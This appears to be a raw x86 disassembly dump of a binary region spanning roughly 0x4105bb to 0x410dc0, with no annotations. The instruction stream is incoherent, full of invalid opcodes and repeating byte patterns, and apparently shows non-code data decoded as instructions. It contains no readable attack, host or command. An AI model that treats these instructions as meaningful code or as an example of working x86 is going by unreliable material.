  4105bb:	and    bh,BYTE PTR [ebp+0x69e824d6]
  4105c1:	add    esp,DWORD PTR [eax]
  4105c3:	pop    ecx
  4105c4:	dec    esp
  4105c5:	mov    eax,0x4058e895
  4105ca:	sub    al,0xa1
  4105cc:	inc    ebx
  4105cd:	arpl   WORD PTR [esi+0x5f],bx
  4105d0:	call   0xad8140ea
  4105d5:	imul   eax,DWORD PTR [ecx+0x40],0x43624005
  4105dc:	inc    ebx
  4105dd:	add    eax,0x62004040
  4105e2:	inc    eax
  4105e3:	add    BYTE PTR [ecx+0x40],al
  4105e6:	inc    ebx
  4105e7:	test   BYTE PTR ds:0x58054041,ah
  4105ed:	inc    eax
  4105ee:	inc    eax
  4105ef:	bound  eax,QWORD PTR [eax+0x66]
  4105f2:	inc    ecx
  4105f3:	inc    eax
  4105f4:	add    eax,0x3ae6c100
  4105f9:	inc    eax
  4105fa:	and    dl,ah
  4105fc:	push   ebx
  4105fd:	pop    esp
  4105fe:	jnp    0x410626
  410600:	xchg   edx,eax
  410601:	adc    dl,BYTE PTR [ebx+edi*4]
  410604:	and    DWORD PTR [edx-0x40],0xffffffc8
  410608:	dec    ebp
  410609:	inc    eax
  41060a:	xor    DWORD PTR [ebx],esp
  41060c:	out    0x35,al
  41060e:	bound  ecx,QWORD PTR gs:[edx+0x14]
  410612:	loope  0x410627
  410614:	add    BYTE PTR [eax],al
  410616:	inc    ebx
  410617:	inc    eax
  410618:	bound  eax,QWORD PTR ds:0x25404110
  41061e:	add    ah,cl
  410620:	inc    ebx
  410621:	add    eax,0x40402562
  410626:	add    BYTE PTR [eax+0x40],al
  410629:	inc    ecx
  41062a:	inc    ecx
  41062b:	add    eax,0x78434025
  410630:	bound  eax,QWORD PTR [eax-0x7c]
  410633:	inc    eax
  410634:	inc    ecx
  410635:	cmp    eax,0x6b1dfd40
  41063a:	inc    eax
  41063b:	xor    ah,BYTE PTR [ecx-0x1c]
  41063e:	mov    al,0xc0
  410640:	clc    
  410641:	and    edx,DWORD PTR [ebx]
  410643:	ss js  0x410666
  410646:	or     eax,0x40346243
  41064b:	jmp    0x41066f
  41064d:	aad    0xd7
  41064f:	push   eax
  410650:	jmp    0x30bb1462
  410655:	int    0xb4
  410657:	pop    esp
  410658:	cwde   
  410659:	retf   
  41065a:	inc    eax
  41065b:	enter  0x4041,0x40
  41065f:	inc    ebx
  410660:	int3   
  410661:	add    BYTE PTR ds:0x56240,al
  410667:	inc    ebx
  410668:	inc    eax
  410669:	inc    eax
  41066a:	add    BYTE PTR [ecx+0x62],al
  41066d:	bound  eax,QWORD PTR [eax]
  41066f:	int3   
  410670:	inc    eax
  410671:	inc    ebx
  410672:	add    eax,0x43624041
  410677:	adc    BYTE PTR [ecx+0x5],al
  41067a:	inc    eax
  41067b:	in     al,0x83
  41067d:	add    eax,0x940664d
  410682:	and    esp,DWORD PTR [ecx]
  410684:	push   edx
  410685:	inc    ebx
  410686:	std    
  410687:	pop    ds
  410688:	rol    BYTE PTR [eax+0x75],cl
  41068b:	bound  edi,QWORD PTR gs:[edi+eiz*2+0x211f692c]
  410693:	and    DWORD PTR [ebp+0x21620441],edi
  410699:	inc    eax
  41069a:	gs jnp 0x41064f
  41069d:	fdiv   DWORD PTR [eax]
  41069f:	inc    ebx
  4106a0:	dec    ebp
  4106a1:	adc    al,0xa1
  4106a3:	and    DWORD PTR [esi],edx
  4106a5:	test   BYTE PTR [ebx-0x5c],dl
  4106a8:	dec    ecx
  4106a9:	inc    eax
  4106aa:	dec    edi
  4106ab:	push   edx
  4106ac:	xchg   esi,eax
  4106ad:	arpl   WORD PTR ds:0xa0106769,ax
  4106b3:	bound  eax,QWORD PTR [ebx+0x40]
  4106b6:	adc    BYTE PTR ds:0x4158cc40,al
  4106bc:	inc    ebx
  4106bd:	bound  eax,QWORD PTR [ecx+0x40]
  4106c0:	add    eax,0x4140
  4106c5:	and    eax,0x40400062
  4106ca:	add    eax,0x84404340
  4106cf:	int3   
  4106d0:	js     0x4106d2
  4106d2:	inc    ecx
  4106d3:	adc    BYTE PTR [edx+0xf],ah
  4106d6:	hlt    
  4106d7:	push   ebp
  4106d8:	mov    ah,0x4
  4106da:	inc    eax
  4106db:	mov    eax,0xbd2f3340
  4106e0:	adc    eax,0x191040e1
  4106e5:	enter  0xb026,0x43
  4106e9:	push   esp
  4106ea:	inc    eax
  4106eb:	or     al,0x40
  4106ed:	sub    DWORD PTR [edi+ebx*2-0x68],eax
  4106f1:	xchg   esi,eax
  4106f2:	sahf   
  4106f3:	leave  
  4106f4:	add    BYTE PTR [eax+0x41],al
  4106f7:	inc    eax
  4106f8:	inc    ebx
  4106f9:	bound  ax,DWORD PTR ds:0x40434100
  410700:	add    eax,0x40054062
  410705:	bound  eax,QWORD PTR [ecx+0x40]
  410708:	inc    ebx
  410709:	inc    eax
  41070a:	add    eax,0x25405841
  41070f:	bound  eax,QWORD PTR [eax+0x43]
  410712:	inc    eax
  410713:	adc    BYTE PTR [edx],dl
  410715:	inc    esp
  410716:	mov    al,ds:0xc4d041ee
  41071b:	es inc eax
  41071d:	popa   
  41071e:	pusha  
  41071f:	cmp    eax,0xb84fcf57
  410724:	add    edi,DWORD PTR [ebx]
  410726:	into   
  410727:	inc    esp
  410728:	in     al,dx
  410729:	les    eax,FWORD PTR [ebx+0x5]
  41072c:	inc    eax
  41072d:	leave  
  41072e:	loop   0x41075d
  410730:	inc    eax
  410731:	inc    ecx
  410732:	inc    ebx
  410733:	inc    eax
  410734:	add    eax,0x43406262
  410739:	inc    ecx
  41073a:	adc    BYTE PTR [eax],al
  41073c:	inc    eax
  41073d:	add    eax,0x43000562
  410742:	add    BYTE PTR [ecx+0x40],al
  410745:	inc    eax
  410746:	add    eax,0x400062
  41074b:	inc    ebx
  41074c:	inc    eax
  41074d:	js     0x410790
  41074f:	inc    ecx
  410750:	bound  eax,QWORD PTR [eax+0x67]
  410753:	(bad)  
  410754:	pop    es
  410755:	retf   
  410756:	add    eax,0x59ae01e8
  41075b:	stos   DWORD PTR es:[edi],eax
  41075c:	sub    BYTE PTR [eax+eax*2+0x35d5553a],ch
  410763:	out    dx,al
  410764:	adc    eax,0x61480415
  410769:	inc    ecx
  41076a:	mov    ah,0x62
  41076c:	inc    eax
  41076d:	add    eax,0x40430041
  410772:	inc    eax
  410773:	inc    ecx
  410774:	inc    eax
  410775:	inc    eax
  410776:	bound  eax,QWORD PTR ds:0x5624300
  41077c:	add    BYTE PTR [eax+0x40],al
  41077f:	add    BYTE PTR [ecx+0x43],al
  410782:	add    BYTE PTR [eax+0x41],al
  410785:	add    eax,0x40436200
  41078a:	inc    eax
  41078b:	add    eax,0xcb68fb62
  410790:	inc    eax
  410791:	popa   
  410792:	jg     0x410782
  410794:	or     eax,0x4048623f
  410799:	sar    DWORD PTR [ebx],0x44
  41079c:	jnp    0x410806
  41079e:	pop    edi
  41079f:	xor    DWORD PTR [eax+0x61],eax
  4107a2:	or     BYTE PTR [eax+eiz*4],ch
  4107a5:	dec    eax
  4107a6:	in     al,0xb4
  4107a8:	adc    al,0x3c
  4107aa:	sub    ebp,DWORD PTR [ebp+ecx*1+0x4063a7c8]
  4107b1:	bound  edx,QWORD PTR [edi]
  4107b3:	int    0xcb
  4107b5:	mov    edi,0x2d1826e0
  4107ba:	push   edx
  4107bb:	inc    edi
  4107bc:	popa   
  4107bd:	inc    ecx
  4107be:	inc    eax
  4107bf:	add    eax,0x41624340
  4107c4:	test   BYTE PTR [eax],al
  4107c6:	and    eax,0x404043
  4107cb:	add    BYTE PTR ds:0x626210,al
  4107d1:	add    eax,0x43404140
  4107d6:	inc    eax
  4107d7:	inc    ecx
  4107d8:	add    eax,0x10664062
  4107dd:	inc    ebx
  4107de:	bound  ecx,QWORD PTR ds:0x40408862
  4107e4:	addr16 out dx,al
  4107e6:	inc    esi
  4107e7:	retf   0x42a9
  4107ea:	adc    al,0x2f
  4107ec:	inc    edx
  4107ed:	inc    esp
  4107ee:	xchg   ebx,eax
  4107ef:	inc    edx
  4107f0:	lods   al,BYTE PTR ds:[esi]
  4107f1:	xor    al,0x40
  4107f3:	clc    
  4107f4:	and    ebp,DWORD PTR [eax+eiz*1]
  4107f7:	inc    esi
  4107f8:	add    eax,0x4041cc
  4107fd:	add    BYTE PTR [eax],al
  4107ff:	inc    eax
  410800:	inc    eax
  410801:	inc    ebx
  410802:	bound  eax,QWORD PTR [eax]
  410804:	inc    eax
  410805:	inc    eax
  410806:	add    eax,0x62434162
  41080b:	inc    eax
  41080c:	js     0x41081e
  41080e:	inc    ecx
  41080f:	add    eax,0x5404325
  410814:	bound  eax,QWORD PTR [eax+0x40]
  410817:	inc    ecx
  410818:	inc    ebx
  410819:	addr16 (bad) 
  41081b:	outs   dx,BYTE PTR ds:[esi]
  41081c:	inc    ebx
  41081d:	pop    es
  41081e:	stos   BYTE PTR es:[edi],al
  41081f:	pusha  
  410820:	in     al,dx
  410821:	(bad)  
  410822:	fs inc eax
  410824:	arpl   cx,bp
  410826:	lds    ebp,FWORD PTR [ecx+eax*2]
  410829:	bound  edi,QWORD PTR [ecx]
  41082b:	push   cs
  41082c:	dec    eax
  41082d:	push   eax
  41082e:	inc    ecx
  41082f:	lock adc dh,dl
  410832:	inc    esi
  410833:	inc    eax
  410834:	popa   
  410835:	das    
  410836:	out    dx,al
  410837:	ror    al,0x38
  41083a:	cmp    al,0xf
  41083c:	inc    ecx
  41083d:	dec    esp
  41083e:	inc    esp
  41083f:	inc    esp
  410840:	push   ecx
  410841:	pop    eax
  410842:	dec    esp
  410843:	inc    eax
  410844:	and    esi,esp
  410846:	sub    al,0x2e
  410848:	retf   0x289c
  41084b:	or     DWORD PTR [ebp+0x6f],ebp
  41084e:	test   al,0xca
  410850:	mov    eax,0x43624125
  410855:	add    BYTE PTR [eax],dl
  410857:	inc    eax
  410858:	add    BYTE PTR ds:0x62410040,al
  41085e:	inc    eax
  41085f:	add    BYTE PTR [ebx-0x34],al
  410862:	inc    eax
  410863:	add    eax,0x78434040
  410868:	bound  eax,QWORD PTR [ecx+0x78]
  41086b:	add    eax,0x62404043
  410870:	pusha  
  410871:	inc    eax
  410872:	inc    eax
  410873:	popa   
  410874:	dec    esp
  410875:	pop    edi
  410876:	clc    
  410877:	or     eax,0x5614c6f9
  41087c:	and    ecx,DWORD PTR [ebp+0x69dd43dd]
  410882:	inc    eax
  410883:	loope  0x410898
  410885:	inc    esp
  410886:	adc    DWORD PTR [ebp+0x41],eax
  410889:	inc    eax
  41088a:	add    eax,0x43436240
  41088f:	add    eax,0x62004040
  410894:	inc    eax
  410895:	add    BYTE PTR [ecx+0x40],al
  410898:	inc    ebx
  410899:	test   BYTE PTR ds:0x58054041,ah
  41089f:	inc    eax
  4108a0:	inc    eax
  4108a1:	bound  eax,QWORD PTR [eax+0x66]
  4108a4:	inc    ecx
  4108a5:	inc    eax
  4108a6:	add    eax,0x3dc3200
  4108ab:	inc    ebp
  4108ac:	and    ch,BYTE PTR [esp+ebp*4]
  4108af:	push   ebx
  4108b0:	pop    eax
  4108b1:	sbb    eax,0xa6bb2440
  4108b6:	(bad)  
  4108b7:	jl     0x410923
  4108b9:	rcl    DWORD PTR ds:0x2acd7f23,0x0
  4108c0:	add    BYTE PTR [ebx+0x40],al
  4108c3:	bound  eax,QWORD PTR ds:0x25404110
  4108c9:	add    ah,cl
  4108cb:	inc    ebx
  4108cc:	add    eax,0x40402562
  4108d1:	add    BYTE PTR [eax+0x40],al
  4108d4:	inc    ecx
  4108d5:	inc    ecx
  4108d6:	add    eax,0x78434025
  4108db:	bound  eax,QWORD PTR [eax-0x7c]
  4108de:	inc    eax
  4108df:	inc    ecx
  4108e0:	push   edx
  4108e1:	inc    esp
  4108e2:	inc    esi
  4108e3:	inc    eax
  4108e4:	inc    ebx
  4108e5:	dec    eax
  4108e6:	inc    ecx
  4108e7:	add    eax,0x12241843
  4108ec:	mov    al,ds:0x4cbee20
  4108f1:	in     eax,dx
  4108f2:	mov    eax,0x4425bd40
  4108f7:	adc    dl,BYTE PTR [edx+0x53]
  4108fa:	add    DWORD PTR [esi+ebp*1],edx
  4108fd:	inc    ecx
  4108fe:	inc    eax
  4108ff:	inc    eax
  410900:	inc    ebx
  410901:	int3   
  410902:	add    BYTE PTR ds:0x56240,al
  410908:	inc    ebx
  410909:	inc    eax
  41090a:	inc    eax
  41090b:	add    BYTE PTR [ecx+0x62],al
  41090e:	bound  eax,QWORD PTR [eax]
  410910:	int3   
  410911:	inc    eax
  410912:	inc    ebx
  410913:	add    eax,0x43624041
  410918:	adc    BYTE PTR [ecx+0x5],al
  41091b:	inc    eax
  41091c:	jbe    0x41094a
  41091e:	mov    al,ds:0x4014af10
  410923:	sub    al,0xa2
  410925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410926:	inc    ecx
  410927:	test   BYTE PTR [ecx+0x26ff13c9],bl
  41092d:	dec    ebp
  41092e:	sub    BYTE PTR [edx+0x29],dl
  410931:	es inc eax
  410933:	aas    
  410934:	iret   
  410935:	lea    esi,[eax]
  410937:	inc    ecx
  410938:	bound  edi,QWORD PTR [eax+0x44a1a10e]
  41093e:	add    al,0x11
  410940:	sbb    DWORD PTR ds:0x2c612d40,ecx
  410946:	xor    al,0xca
  410948:	clc    
  410949:	inc    esp
  41094a:	or     DWORD PTR [ebx+0x4362a221],esp
  410950:	inc    eax
  410951:	adc    BYTE PTR ds:0x4158cc40,al
  410957:	inc    ebx
  410958:	bound  eax,QWORD PTR [ecx+0x40]
  41095b:	add    eax,0x4140
  410960:	and    eax,0x40400062
  410965:	add    eax,0x84404340
  41096a:	int3   
  41096b:	js     0x41096d
  41096d:	inc    ecx
  41096e:	adc    BYTE PTR [edx+0xf],ah
  410971:	mov    edi,0x40c068b8
  410976:	and    dl,BYTE PTR [edi-0x2b]
  410979:	mov    eax,0x1f747c41
  41097e:	and    ah,BYTE PTR [eax+0x62a5c362]
  410984:	bound  eax,QWORD PTR [eax+0x21]
  410987:	pop    ss
  410988:	out    dx,al
  410989:	xchg   ecx,eax
  41098a:	xor    BYTE PTR [edx+edx*4+0x44605414],ah
  410991:	inc    ebx
  410992:	retf   
  410993:	xchg   DWORD PTR [ebx+0x40],esi
  410996:	and    DWORD PTR [edi+0x2c],esp
  410999:	dec    esp
  41099a:	push   0x40109155
  41099f:	loope  0x410941
  4109a1:	rol    BYTE PTR [eax],1
  4109a3:	inc    eax
  4109a4:	inc    ecx
  4109a5:	inc    eax
  4109a6:	inc    ebx
  4109a7:	bound  ax,DWORD PTR ds:0x40434100
  4109ae:	add    eax,0x40054062
  4109b3:	bound  eax,QWORD PTR [ecx+0x40]
  4109b6:	inc    ebx
  4109b7:	inc    eax
  4109b8:	add    eax,0x25405841
  4109bd:	bound  eax,QWORD PTR [eax+0x43]
  4109c0:	inc    eax
  4109c1:	adc    BYTE PTR [eiz*2+0x42a34064],bh
  4109c8:	dec    ebp
  4109c9:	enter  0xb888,0xcb
  4109cd:	sbb    DWORD PTR [ebx],edi
  4109cf:	pusha  
  4109d0:	lea    eax,[ebx+0x7b]
  4109d3:	ins    DWORD PTR es:[edi],dx
  4109d4:	enter  0x4840,0x24
  4109d8:	inc    esp
  4109d9:	sub    DWORD PTR [ecx-0x6f],eax
  4109dc:	retf   
  4109dd:	adc    ah,BYTE PTR [eax]
  4109df:	ins    BYTE PTR es:[edi],dx
  4109e0:	inc    eax
  4109e1:	inc    ecx
  4109e2:	inc    ebx
  4109e3:	inc    eax
  4109e4:	add    eax,0x43406262
  4109e9:	inc    ecx
  4109ea:	adc    BYTE PTR [eax],al
  4109ec:	inc    eax
  4109ed:	add    eax,0x43000562
  4109f2:	add    BYTE PTR [ecx+0x40],al
  4109f5:	inc    eax
  4109f6:	add    eax,0x400062
  4109fb:	inc    ebx
  4109fc:	inc    eax
  4109fd:	js     0x410a40
  4109ff:	inc    ecx
  410a00:	bound  eax,QWORD PTR [eax+0x2c]
  410a03:	out    dx,al
  410a04:	add    ah,BYTE PTR [ebx-0x41]
  410a07:	inc    eax
  410a08:	and    eax,0xfe3e9e21
  410a0d:	push   edi
  410a0e:	mov    edi,0xc5d82303
  410a13:	rol    DWORD PTR [ebp+0x6f],0xa8
  410a17:	inc    eax
  410a18:	and    DWORD PTR [edx],esp
  410a1a:	(bad)
  410a1e:	inc    BYTE PTR ds:0x30fe303c
  410a24:	test   BYTE PTR [ebx+0x43],ah
  410a27:	inc    eax
  410a28:	out    0x62,al
  410a2a:	inc    eax
  410a2b:	add    eax,0x40430041
  410a30:	inc    eax
  410a31:	inc    ecx
  410a32:	inc    eax
  410a33:	inc    eax
  410a34:	bound  eax,QWORD PTR ds:0x5624300
  410a3a:	add    BYTE PTR [eax+0x40],al
  410a3d:	add    BYTE PTR [ecx+0x43],al
  410a40:	add    BYTE PTR [eax+0x41],al
  410a43:	add    eax,0x40436200
  410a48:	inc    eax
  410a49:	add    eax,0x42444062
  410a4e:	push   edx
  410a4f:	jno    0x410a6e
  410a51:	add    al,0x30
  410a53:	mov    eax,ds:0x64182a2c
  410a58:	ins    BYTE PTR es:[edi],dx
  410a59:	inc    eax
  410a5a:	sub    BYTE PTR ds:0x5228209c,ch
  410a60:	bound  eax,QWORD PTR [eax-0x5e]
  410a63:	inc    esp
  410a64:	aad    0x34
  410a66:	push   edx
  410a67:	inc    ecx
  410a68:	inc    eax
  410a69:	add    eax,0x41624340
  410a6e:	test   BYTE PTR [eax],al
  410a70:	and    eax,0x404043
  410a75:	add    BYTE PTR ds:0x626210,al
  410a7b:	add    eax,0x43404140
  410a80:	inc    eax
  410a81:	inc    ecx
  410a82:	add    eax,0x10664062
  410a87:	inc    ebx
  410a88:	(bad)  
  410a89:	shl    BYTE PTR [eax+eax*2+0x29],0x62
  410a8e:	push   edi
  410a8f:	cmp    dh,0x4c
  410a92:	sub    BYTE PTR [esi+ebx*2],ah
  410a95:	and    esi,edi
  410a97:	lds    ecx,FWORD PTR [edi+0x39]
  410a9a:	dec    eax
  410a9b:	inc    eax
  410a9c:	and    BYTE PTR [esi+0x44],cl
  410a9f:	xchg   edx,eax
  410aa0:	mov    eax,0xf540287b
  410aa5:	and    BYTE PTR [esp+eax*2],ch
  410aa8:	inc    edx
  410aa9:	or     ebp,DWORD PTR [eax+eax*2+0x59a1760]
  410ab0:	int3   
  410ab1:	inc    ecx
  410ab2:	inc    eax
  410ab3:	add    BYTE PTR [eax],al
  410ab5:	add    BYTE PTR [eax+0x40],al
  410ab8:	inc    ebx
  410ab9:	bound  eax,QWORD PTR [eax]
  410abb:	inc    eax
  410abc:	inc    eax
  410abd:	add    eax,0x62434162
  410ac2:	inc    eax
  410ac3:	js     0x410ad5
  410ac5:	inc    ecx
  410ac6:	add    eax,0x5404325
  410acb:	bound  eax,QWORD PTR [eax+0x40]
  410ace:	inc    ecx
  410acf:	inc    ebx
  410ad0:	and    bl,bh
  410ad2:	in     eax,0x5
  410ad4:	and    esi,DWORD PTR [esi+0x53c8cd46]
  410ada:	(bad)  
  410adb:	leave  
  410adc:	inc    eax
  410add:	xchg   ecx,eax
  410ade:	loope  0x410b05
  410ae0:	jge    0x410aec
  410ae2:	test   DWORD PTR [edx+0x40],0x386e1440
  410ae9:	xor    ecx,DWORD PTR [edi+0x44]
  410aec:	inc    eax
  410aed:	add    al,0xa1
  410aef:	fs fs mov al,0x36
  410af3:	lock and dh,BYTE PTR [eax+0x76]
  410af7:	inc    esp
  410af8:	mov    DWORD PTR ds:0x436241,esp
  410afe:	adc    BYTE PTR [eax+0x0],al
  410b01:	add    eax,0x62410040
  410b06:	inc    eax
  410b07:	add    BYTE PTR [ebx-0x34],al
  410b0a:	inc    eax
  410b0b:	add    eax,0x78434040
  410b10:	bound  eax,QWORD PTR [ecx+0x78]
  410b13:	add    eax,0x62404043
  410b18:	adc    eax,0x404022b2
  410b1d:	arpl   WORD PTR [eax+ebp*4],bp
  410b20:	jnp    0x410b86
  410b22:	inc    esp
  410b23:	inc    eax
  410b24:	add    BYTE PTR [eax-0x68],al
  410b27:	adc    DWORD PTR [eax+0x7840d11b],edi
  410b2d:	pusha  
  410b2e:	lds    edi,FWORD PTR [eax+0x21257c15]
  410b34:	inc    eax
  410b35:	out    dx,eax
  410b36:	dec    edx
  410b37:	inc    edx
  410b38:	retf   
  410b39:	inc    ecx
  410b3a:	inc    eax
  410b3b:	add    eax,0x43436240
  410b40:	add    eax,0x62004040
  410b45:	inc    eax
  410b46:	add    BYTE PTR [ecx+0x40],al
  410b49:	inc    ebx
  410b4a:	test   BYTE PTR ds:0x58054041,ah
  410b50:	inc    eax
  410b51:	inc    eax
  410b52:	bound  eax,QWORD PTR [eax+0x66]
  410b55:	inc    ecx
  410b56:	inc    eax
  410b57:	add    eax,0x40206200
  410b5c:	arpl   WORD PTR [ebx],si
  410b5e:	out    dx,al
  410b5f:	popa   
  410b60:	inc    ebp
  410b61:	jae    0x410ba9
  410b63:	inc    eax
  410b64:	sub    BYTE PTR [esi+0x44],dl
  410b67:	hlt    
  410b68:	scas   al,BYTE PTR es:[edi]
  410b69:	lods   al,BYTE PTR ds:[esi]
  410b6a:	enter  0x4040,0xe0
  410b6e:	sub    al,0x65
  410b70:	xor    BYTE PTR [edx+0x0],ah
  410b73:	push   eax
  410b74:	jp     0x410ba2
  410b76:	xchg   esi,eax
  410b77:	test   ah,dh
  410b79:	xchg   ebx,eax
  410b7a:	aam    0x40
  410b7c:	inc    esp
  410b7d:	or     eax,0xb4c015d5
  410b82:	ss inc eax
  410b84:	add    ah,cl
  410b86:	inc    edi
  410b87:	retf   
  410b88:	bound  esp,QWORD PTR [edx+0x1c]
  410b8b:	add    BYTE PTR [eax],al
  410b8d:	inc    ebx
  410b8e:	inc    eax
  410b8f:	bound  eax,QWORD PTR ds:0x25404110
  410b95:	add    ah,cl
  410b97:	inc    ebx
  410b98:	add    eax,0x40402562
  410b9d:	add    BYTE PTR [eax+0x40],al
  410ba0:	inc    ecx
  410ba1:	inc    ecx
  410ba2:	add    eax,0x78434025
  410ba7:	bound  eax,QWORD PTR [eax-0x7c]
  410baa:	inc    eax
  410bab:	inc    ecx
  410bac:	inc    eax
  410bad:	sub    al,0x6a
  410baf:	out    dx,al
  410bb0:	adc    DWORD PTR [ebx+0x25],eax
  410bb3:	fld    QWORD PTR [ebx+ebx*4+0x66]
  410bb7:	inc    esp
  410bb8:	mov    ah,0x7c
  410bba:	xor    BYTE PTR [eax],dl
  410bbc:	inc    eax
  410bbd:	cmp    DWORD PTR [esp+ebp*1+0x42],0x40426253
  410bc5:	mov    ah,0x42
  410bc7:	xchg   esp,eax
  410bc8:	ja     0x410b7a
  410bca:	adc    eax,0x41854006
  410bcf:	inc    eax
  410bd0:	inc    eax
  410bd1:	inc    ebx
  410bd2:	int3   
  410bd3:	add    BYTE PTR ds:0x56240,al
  410bd9:	inc    ebx
  410bda:	inc    eax
  410bdb:	inc    eax
  410bdc:	add    BYTE PTR [ecx+0x62],al
  410bdf:	bound  eax,QWORD PTR [eax]
  410be1:	int3   
  410be2:	inc    eax
  410be3:	inc    ebx
  410be4:	add    eax,0x43624041
  410be9:	adc    BYTE PTR [ecx+0x5],al
  410bec:	inc    eax
  410bed:	pusha  
  410bee:	dec    eax
  410bef:	xor    BYTE PTR ds:0x584304cd,cl
  410bf5:	and    bl,BYTE PTR [ebp-0x32ef349e]
  410bfb:	inc    eax
  410bfc:	add    BYTE PTR [edx],bl
  410bfe:	inc    esp
  410bff:	test   BYTE PTR [esi+esi*1],ah
  410c02:	inc    edx
  410c03:	inc    eax
  410c04:	das    
  410c05:	jne    0x410c69
  410c07:	inc    ebx
  410c08:	inc    eax
  410c09:	adc    BYTE PTR ds:0x4158cc40,al
  410c0f:	inc    ebx
  410c10:	bound  eax,QWORD PTR [ecx+0x40]
  410c13:	add    eax,0x4140
  410c18:	and    eax,0x40400062
  410c1d:	add    eax,0x84404340
  410c22:	int3   
  410c23:	js     0x410c25
  410c25:	inc    ecx
  410c26:	adc    BYTE PTR [edx+0xf],ah
  410c29:	sub    al,0x5
  410c2b:	ss jbe 0x410c6f
  410c2e:	inc    eax
  410c2f:	outs   dx,BYTE PTR ds:[esi]
  410c30:	arpl   WORD PTR [edx-0xb97bd37],dx
  410c36:	inc    edx
  410c37:	dec    esp
  410c38:	ja     0x410bff
  410c3a:	nop
  410c3b:	ss mov DWORD PTR gs:[eax-0x80],0xfc055ceb
  410c44:	adc    BYTE PTR [eax-0x11bf9fc0],ch
  410c4a:	retf   
  410c4b:	arpl   WORD PTR [ebx+0x12],di
  410c4e:	add    BYTE PTR [eax+0x41],al
  410c51:	inc    eax
  410c52:	inc    ebx
  410c53:	bound  ax,DWORD PTR ds:0x40434100
  410c5a:	add    eax,0x40054062
  410c5f:	bound  eax,QWORD PTR [ecx+0x40]
  410c62:	inc    ebx
  410c63:	inc    eax
  410c64:	add    eax,0x25405841
  410c69:	bound  eax,QWORD PTR [eax+0x43]
  410c6c:	inc    eax
  410c6d:	adc    BYTE PTR [eax-0x55],al
  410c70:	and    eax,0xf927904d
  410c75:	mov    eax,0x2c678541
  410c7a:	inc    esp
  410c7b:	mov    ah,0x42
  410c7d:	adc    eax,0x9020dc40
  410c82:	ins    BYTE PTR es:[edi],dx
  410c83:	arpl   WORD PTR [eax+0x28040cb],si
  410c89:	aad    0x28
  410c8b:	ret    0xb0f4
  410c8e:	inc    eax
  410c8f:	jp     0x410ce3
  410c91:	int3   
  410c92:	arpl   WORD PTR [ebx+eiz*2+0x434140cb],dx
  410c99:	inc    eax
  410c9a:	add    eax,0x43406262
  410c9f:	inc    ecx
  410ca0:	adc    BYTE PTR [eax],al
  410ca2:	inc    eax
  410ca3:	add    eax,0x43000562
  410ca8:	add    BYTE PTR [ecx+0x40],al
  410cab:	inc    eax
  410cac:	add    eax,0x400062
  410cb1:	inc    ebx
  410cb2:	inc    eax
  410cb3:	js     0x410cf6
  410cb5:	inc    ecx
  410cb6:	bound  eax,QWORD PTR [eax+0x41]
  410cb9:	inc    ebp
  410cba:	and    BYTE PTR [edx],dh
  410cbc:	push   esp
  410cbd:	and    eax,0x404479
  410cc2:	pcmpgtb mm5,QWORD PTR [edi+ecx*4+0x63]
  410cc7:	inc    esi
  410cc8:	inc    eax
  410cc9:	cmp    bh,BYTE PTR [edi]
  410ccb:	inc    esp
  410ccc:	sub    DWORD PTR [edx+0x40],esp
  410ccf:	add    eax,0x40430041
  410cd4:	inc    eax
  410cd5:	inc    ecx
  410cd6:	inc    eax
  410cd7:	inc    eax
  410cd8:	bound  eax,QWORD PTR ds:0x5624300
  410cde:	add    BYTE PTR [eax+0x40],al
  410ce1:	add    BYTE PTR [ecx+0x43],al
  410ce4:	add    BYTE PTR [eax+0x41],al
  410ce7:	add    eax,0x40436200
  410cec:	inc    eax
  410ced:	add    eax,0x4231a862
  410cf2:	inc    eax
  410cf3:	mov    WORD PTR [ebp+0x2c],?
  410cf6:	(bad)  
  410cf7:	stc    
  410cf8:	inc    ebx
  410cf9:	sub    al,0x43
  410cfb:	xor    BYTE PTR [esi-0x2a86f72],0x3b
  410d02:	inc    eax
  410d03:	cmc    
  410d04:	adc    cl,ch
  410d06:	or     eax,0x40d56753
  410d0b:	ins    DWORD PTR es:[edi],dx
  410d0c:	std    
  410d0d:	dec    esi
  410d0e:	leave  
  410d0f:	dec    eax
  410d10:	push   cs
  410d11:	pop    ebx
  410d12:	inc    eax
  410d13:	out    dx,eax
  410d14:	adc    bh,dh
  410d16:	inc    ecx
  410d17:	inc    eax
  410d18:	add    eax,0x41624340
  410d1d:	test   BYTE PTR [eax],al
  410d1f:	and    eax,0x404043
  410d24:	add    BYTE PTR ds:0x626210,al
  410d2a:	add    eax,0x43404140
  410d2f:	inc    eax
  410d30:	inc    ecx
  410d31:	add    eax,0x10664062
  410d36:	inc    ebx
  410d37:	bound  ebp,QWORD PTR [eax+0x402e9c6b]
  410d3d:	add    al,0xff
  410d3f:	inc    esp
  410d40:	or     eax,0x30c253f1
  410d45:	es dec edi
  410d47:	sub    al,0xcb
  410d49:	arpl   WORD PTR [ecx-0x56ba158c],cx
  410d4f:	mov    WORD PTR [eax+0x45],cs
  410d52:	in     eax,0x62
  410d54:	je     0x410d57
  410d56:	add    eax,0x653833c5
  410d5b:	fwait
  410d5c:	std    
  410d5d:	repz icebp 
  410d5f:	inc    edi
  410d60:	test   al,0xd5
  410d62:	bound  ebx,QWORD PTR [esi]
  410d64:	test   DWORD PTR [edx-0x33fa11c0],0x4041
  410d6e:	add    BYTE PTR [eax+0x40],al
  410d71:	inc    ebx
  410d72:	bound  eax,QWORD PTR [eax]
  410d74:	inc    eax
  410d75:	inc    eax
  410d76:	add    eax,0x62434162
  410d7b:	inc    eax
  410d7c:	js     0x410d8e
  410d7e:	inc    ecx
  410d7f:	add    eax,0x5404325
  410d84:	bound  eax,QWORD PTR [eax+0x40]
  410d87:	inc    ecx
  410d88:	inc    ebx
  410d89:	add    eax,0xca356cc4
  410d8e:	cmp    DWORD PTR [esi],esp
  410d90:	clc    
  410d91:	jns    0x410de2
  410d93:	sub    BYTE PTR [eax-0x80],cl
  410d96:	xchg   edx,eax
  410d97:	je     0x410daa
  410d99:	mov    esp,0x495ec640
  410d9e:	add    DWORD PTR [eax+0x25],eax
  410da1:	add    eax,0x7121c5b4
  410da6:	push   0x6
  410da8:	bound  ebp,QWORD PTR [ebx+0x42]
  410dab:	dec    edi
  410dac:	fucomp st(4)
  410dae:	add    DWORD PTR [eax+0x6cfd54d5],edi
  410db4:	jns    0x410dbb
  410db6:	sbb    ecx,DWORD PTR [edx]
  410db8:	and    eax,0x436241
  410dbd:	adc    BYTE PTR [eax+0x0],al
  410dc0:	add    eax,0x62410040
